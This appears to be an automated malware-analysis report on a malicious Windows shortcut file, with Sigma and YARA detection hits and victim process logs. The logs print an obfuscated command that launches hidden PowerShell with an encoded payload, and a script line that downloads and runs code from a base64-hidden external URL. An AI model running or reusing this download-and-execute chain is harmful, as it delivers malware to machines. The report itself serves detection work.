attributes.magic: MS Windows shortcut, Item id list present, Has Relative path, Has command line arguments, Icon number=347, ctime=Thu Dec 31 23:59:59 1969, mtime=Thu Dec 31 23:59:59 1969, atime=Thu Dec 31 23:59:59 1969, length=0, window=hide

exiftool.Flags: IDList, RelativePath, CommandArgs, IconFile, Unicode, ExpString, ExpIcon

threat_severity.level_description: Severity HIGH because it was considered trojan. Other contributing factor was that it could not be run in sandboxes.

sigma_analysis_results.rule_description: Detects suspicious PowerShell invocation with a parameter substring
sigma_analysis_results.rule_author: Florian Roth (Nextron Systems), Daniel Bohannon (idea), Roberto Rodriguez (Fix)

match_context.values: @{Product=Microsoft\xae Windows\xae Operating System; CurrentDirectory=C:\Users\Bruno\Desktop\; OriginalFileName=PowerShell.EXE; Hashes=MD5=04029E121A0CFA5991749937DD22A1D9,SHA256=9F914D42706FE215501044ACD85A32D58AAEF1419D404FDDFA5D3B48F66CCD9F,IMPHASH=7C955A0ABC747F57CCC4324480737EF7; Description=Windows PowerShell; EventID=1; ParentCommandLine="C:\Windows\system32\cmd.exe" /v /k "st^a^rT /min "" pO^w^e^R^S^HE^LL -W hI^DD^E^n -n^o^Logo -N^oP -Ep bYpAss -EnC^o^D^EDC^O^m^MANd " [TRUNCATED]; CommandLine=pOweRSHELL  -W hIDDEn -noLogo -NoP -Ep bYpAss -EnCoDEDCOmMANd " [TRUNCATED]; FileVersion=10.0.19041.546 (WinBuild.160101.0800); ParentImage=C:\Windows\System32\cmd.exe; IntegrityLevel=High; Image=C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe; Company=Microsoft Corporation}

sigma_analysis_results.rule_title: Usage Of Web Request Commands And Cmdlets - ScriptBlock
sigma_analysis_results.rule_description: Detects the use of various web request commands with commandline tools and Windows PowerShell cmdlets (including aliases) via PowerShell scriptblock logs

match_context.values: @{ScriptBlockText=IEX ([TexT.ENcodInG]::UTF8.GETSTriNG((iwr ([System.Text.Encoding]::UTF8.GetString([Convert]::FromBase64String("aHR0cHM6Ly91eXQxbjhkZWQ5ZmIzODAuY29tL3c=")))).CONteNt)); MessageTotal=1; ScriptBlockId=4dfd6c39-3545-42cc-a394-18a9532b2886; Path=; MessageNumber=1; EventID=4104}

sigma_analysis_results.rule_description: Commandline to launch powershell with a base64 payload

match_context.values: @{Product=Microsoft\xae Windows\xae Operating System; CurrentDirectory=C:\Users\Bruno\Desktop\; OriginalFileName=PowerShell.EXE; Hashes=MD5=04029E121A0CFA5991749937DD22A1D9,SHA256=9F914D42706FE215501044ACD85A32D58AAEF1419D404FDDFA5D3B48F66CCD9F,IMPHASH=7C955A0ABC747F57CCC4324480737EF7; Description=Windows PowerShell; FileVersion=10.0.19041.546 (WinBuild.160101.0800); ParentCommandLine="C:\Windows\system32\cmd.exe" /v /k "st^a^rT /min "" pO^w^e^R^S^HE^LL -W hI^DD^E^n -n^o^Logo -N^oP -Ep bYpAss -EnC^o^D^EDC^O^m^MANd " [TRUNCATED]; CommandLine=pOweRSHELL  -W hIDDEn -noLogo -NoP -Ep bYpAss -EnCoDEDCOmMANd " [TRUNCATED]; EventID=1; ParentImage=C:\Windows\System32\cmd.exe; IntegrityLevel=High; Image=C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe; Company=Microsoft Corporation}

@{Hashes=SHA1=1B3B40FBC889FD4C645CC12C85D0805AC36BA254,MD5=95000560239032BC68B4C2FDFCDEF913,SHA256=D3F8FADE829D2B7BD596C4504A6DAE5C034E789B6A3DEFBE013BDA7D14466677,IMPHASH=741776AACCFC5B71FF59832DCDCACE0F; CurrentDirectory=C:\Users\george\Desktop\; OriginalFileName=PowerShell.EXE; Product=Microsoft\xae Windows\xae Operating System; Description=Windows PowerShell; FileVersion=10.0.17134.1 (WinBuild.160101.0800); ParentCommandLine="C:\Windows\system32\cmd.exe" /v /k "st^a^rT /min "" pO^w^e^R^S^HE^LL -W hI^DD^E^n -n^o^Logo -N^oP -Ep bYpAss -EnC^o^D^EDC^O^m^MANd " [TRUNCATED]; CommandLine=pOweRSHELL  -W hIDDEn -noLogo -NoP -Ep bYpAss -EnCoDEDCOmMANd " [TRUNCATED]; EventID=1; ParentImage=C:\Windows\System32\cmd.exe; IntegrityLevel=High; Image=C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe; Company=Microsoft Corporation}

sigma_analysis_results.rule_description: Detects non-interactive PowerShell activity by looking at the "powershell" process with a non-user GUI process such as "explorer.exe" as a parent.

match_context.values: @{Product=Microsoft\xae Windows\xae Operating System; CurrentDirectory=C:\Users\Bruno\Desktop\; OriginalFileName=PowerShell.EXE; Hashes=MD5=04029E121A0CFA5991749937DD22A1D9,SHA256=9F914D42706FE215501044ACD85A32D58AAEF1419D404FDDFA5D3B48F66CCD9F,IMPHASH=7C955A0ABC747F57CCC4324480737EF7; Description=Windows PowerShell; EventID=1; ParentCommandLine="C:\Windows\system32\cmd.exe" /v /k "st^a^rT /min "" pO^w^e^R^S^HE^LL -W hI^DD^E^n -n^o^Logo -N^oP -Ep bYpAss -EnC^o^D^EDC^O^m^MANd " [TRUNCATED]; CommandLine=pOweRSHELL  -W hIDDEn -noLogo -NoP -Ep bYpAss -EnCoDEDCOmMANd " [TRUNCATED]; FileVersion=10.0.19041.546 (WinBuild.160101.0800); ParentImage=C:\Windows\System32\cmd.exe; IntegrityLevel=High; Image=C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe; Company=Microsoft Corporation}

@{Product=Microsoft\xae Windows\xae Operating System; CurrentDirectory=C:\Users\george\Desktop\; OriginalFileName=PowerShell.EXE; Hashes=SHA1=1B3B40FBC889FD4C645CC12C85D0805AC36BA254,MD5=95000560239032BC68B4C2FDFCDEF913,SHA256=D3F8FADE829D2B7BD596C4504A6DAE5C034E789B6A3DEFBE013BDA7D14466677,IMPHASH=741776AACCFC5B71FF59832DCDCACE0F; Description=Windows PowerShell; EventID=1; ParentCommandLine="C:\Windows\system32\cmd.exe" /v /k "st^a^rT /min "" pO^w^e^R^S^HE^LL -W hI^DD^E^n -n^o^Logo -N^oP -Ep bYpAss -EnC^o^D^EDC^O^m^MANd " [TRUNCATED]; CommandLine=pOweRSHELL  -W hIDDEn -noLogo -NoP -Ep bYpAss -EnCoDEDCOmMANd " [TRUNCATED]; FileVersion=10.0.17134.1 (WinBuild.160101.0800); ParentImage=C:\Windows\System32\cmd.exe; IntegrityLevel=High; Image=C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe; Company=Microsoft Corporation}

sigma_analysis_results.rule_description:
When C# is compiled dynamically, a .cmdline file will be created as a part of the process.
Certain processes are not typically observed compiling C# code, but can do so without touching disk.
This can be used to unpack a payload for execution

match_context.values: @{Image=C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe; TargetFilename=C:\Users\Bruno\AppData\Local\Temp\b1zzipw0\b1zzipw0.cmdline; EventID=11}
@{Image=C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe; TargetFilename=C:\Users\george\AppData\Local\Temp\u4sj35cq\u4sj35cq.cmdline; EventID=11}

crowdsourced_yara_results.description: This rule detects Microsoft Windows LNK shortcut files that reference the cmd.exe command interpreter. While not necessarily indicative of malicious behavior, this is a common pivot leveraged by a variety of malware campaigns.
crowdsourced_yara_results.author: InQuest Labs

crowdsourced_yara_results.description: Identifies PowerShell artefacts in shortcut (LNK) files.
crowdsourced_yara_results.author: @bartblaze

crowdsourced_yara_results.description: Identifies executable artefacts in shortcut (LNK) files.
crowdsourced_yara_results.author: @bartblaze

crowdsourced_yara_results.description: Identifies execution artefacts in shortcut (LNK) files.
crowdsourced_yara_results.author: @bartblaze
